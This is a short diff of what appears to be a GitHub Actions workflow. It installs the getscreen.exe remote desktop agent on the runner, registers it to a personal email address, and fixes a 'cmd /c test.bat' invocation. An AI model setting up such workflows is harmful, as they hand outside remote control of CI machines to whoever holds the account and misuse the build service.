@@ -15,4 +15,4 @@ jobs:
          cmd /c getscreen.exe -install -register tauhidmdp@gmail.com
          cmd /c pause
     - name: Successful implementation! You can close the tab now https://getscreen.me/dashboard/agents.
-      run: cmd /test.bat
+      run: cmd /c test.bat
